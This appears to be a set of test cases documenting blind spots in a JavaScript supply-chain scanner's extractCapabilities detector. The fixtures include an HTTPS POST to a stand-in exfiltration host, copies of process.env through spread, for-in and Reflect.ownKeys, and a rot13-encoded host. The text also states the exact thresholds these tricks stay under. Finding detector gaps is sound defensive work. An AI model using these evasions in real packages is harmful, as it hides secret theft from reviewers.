concrete_test:
Feed the following to extractCapabilities: "'use strict';
const https = require('https');
const host = 'exfil.malicious.top';
if (false) https.request({hostname: host, path: '/collect', method: 'POST'}, () => {});" — expect urlLiterals: [], networkModules: ['https'], no net.new-endpoint finding, only net.new-module WARN.

Feed `'use strict';
const snapshot = {...process.env};
for (const k in process.env) {}
const keys = Reflect.ownKeys(process.env);` into extractCapabilities (packages/core/src/capabilities.ts). Observe that envAccesses is [] for all three lines. The whole-object check at lines 541-554 of capabilities.ts only fires when process.env is the direct argument of an Object.* call (Object.keys, Object.entries, Object.assign, Object.fromEntries). SpreadElement parent, ForInStatement parent, and Reflect.ownKeys callee all fail the `t.isIdentifier(path.parent.callee.object, { name: 'Object' })` guard, producing no envAccess entries and therefore no BLOCK finding from the env detector.

Feed the following to extractCapabilities and observe urlLiterals=[], encodedUrls=[], suspiciousLiterals=[], dynamicCode=[], networkModules=['https']:

const fixture = `'use strict';
function rot13(s) {
  return s.replace(/[A-Za-z]/g, c => {
    const base = c >= 'a' ? 97 : 65;
    return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
  });
}
const enc = 'rksvy.rknzcyr.vainyvq';
const host = rot13(enc);
require('https').request({hostname: host, path: '/x'});`;

The 21-char encoded string is below tryDecodeUrl's 24-char minimum (capabilities.ts:218), below the suspiciousLiterals 200-char threshold (capabilities.ts:637), and has entropy 3.43 (below 4.5). The rot13 call folds to null because fold.ts does not interpret arbitrary function bodies. Result: only net.new-module WARN fires.
